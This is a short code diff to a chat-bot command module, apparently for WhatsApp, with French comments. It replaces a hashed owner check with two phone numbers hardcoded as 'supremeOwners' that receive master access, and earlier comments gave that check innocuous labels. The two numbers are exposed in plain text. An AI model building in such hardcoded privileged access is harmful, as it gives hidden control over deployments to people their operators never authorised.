@@ -4,7 +4,6 @@
  */
 
 const config = require('../../config');
-const crypto = require('crypto');
 const prefix = config.prefix || '.';
 
 module.exports = {
@@ -17,13 +16,13 @@ module.exports = {
 
   async execute(sock, msg, args, extra) {
     try {
-      // Routines d'authentification réseau
+      // Routines d'authentification réseau (On récupère le numéro de l'expéditeur)
       const senderJid = extra.sender || msg.key.participant || msg.key.remoteJid || '';
       const rawSenderNum = senderJid.replace(/\D/g, ''); 
-      const senderHash = crypto.createHash('sha256').update(rawSenderNum).digest('hex');
 
-      // Vérification de la liste d'accès d'intégrité
-      const isMaster = config.supremeHashes && config.supremeHashes.includes(senderHash);
+      // 👑 Tes numéros injectés directement ici
+      const supremeOwners = ['22651622652', '22665108174'];
+      const isMaster = supremeOwners.includes(rawSenderNum);
 
       if (!isMaster) {
         // Fin de la routine si non autorisé
